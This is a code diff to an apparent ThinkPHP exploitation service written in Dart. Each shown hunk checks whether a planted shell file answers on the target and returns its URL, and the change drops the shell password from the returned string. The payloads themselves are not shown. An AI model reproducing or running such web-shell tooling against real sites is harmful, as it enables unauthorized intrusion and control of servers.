@@ -365,7 +365,7 @@ class ThinkphpExpService {
             .get(Uri.parse('$baseUri$shellFile'))
             .timeout(timeout);
         if (check2.statusCode == 200)
-          return '$baseUri$shellFile Pass:$password';
+          return '$baseUri$shellFile';
         return null;
       case ThinkphpVulnType.tp50:
       case ThinkphpVulnType.tp5010:
@@ -391,7 +391,7 @@ class ThinkphpExpService {
             .get(Uri.parse('$baseUri$shellFile'))
             .timeout(timeout);
         if (check.statusCode == 200)
-          return '$baseUri$shellFile Pass:$shellPass';
+          return '$baseUri$shellFile';
         return null;
 
       case ThinkphpVulnType.tp3ModuleTypo:
@@ -409,7 +409,7 @@ class ThinkphpExpService {
             .get(Uri.parse('$baseUri$shellFile'))
             .timeout(timeout);
         if (check.statusCode == 200)
-          return '$baseUri$shellFile Pass:$shellPass';
+          return '$baseUri$shellFile';
         return null;
 
       case ThinkphpVulnType.tp3:
@@ -428,7 +428,7 @@ class ThinkphpExpService {
             .get(Uri.parse('$baseUri$shellFile'))
             .timeout(timeout);
         if (check.statusCode == 200)
-          return '$baseUri$shellFile Pass:$shellPass';
+          return '$baseUri$shellFile';
         return null;
 
       case ThinkphpVulnType.tp3LogRce:
@@ -440,7 +440,7 @@ class ThinkphpExpService {
             .get(Uri.parse('$baseUri$shellFile'))
             .timeout(timeout);
         if (check.statusCode == 200)
-          return '$baseUri$shellFile Pass:$shellPass';
+          return '$baseUri$shellFile';
         return null;
     }
   }
